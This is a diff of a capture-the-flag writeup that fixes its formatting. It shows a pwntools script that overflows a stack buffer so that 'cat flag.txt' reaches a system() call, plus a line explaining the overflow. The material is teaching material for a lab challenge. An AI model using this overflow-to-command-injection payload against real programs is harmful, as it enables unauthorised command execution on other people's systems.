@@ -1,6 +1,7 @@
-#Writeup
+# Writeup
 
-'''
+
+```
 #!python3
 from pwn import *
 
@@ -19,4 +20,5 @@ p = start()
 p.recvuntil(b'name?\n')
 p.sendline(b'A'*10 + b'cat flag.txt\n')
 p.interactive()
-'''
+```
+As you can see, `buffer` will overflow into `c` (as they are stack-allocated), then `c` is passed to `system()`.
